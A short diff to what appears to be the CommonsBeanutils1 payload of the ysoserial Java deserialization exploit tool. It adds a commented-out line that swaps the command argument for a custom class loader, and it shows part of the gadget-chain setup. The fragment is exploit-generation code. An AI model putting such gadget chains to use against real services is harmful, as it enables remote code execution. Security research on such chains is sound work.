@@ -18,6 +18,8 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
 		final Object templates = Gadgets.createTemplatesImpl(command);
+//        final Object templates = Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);
+
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
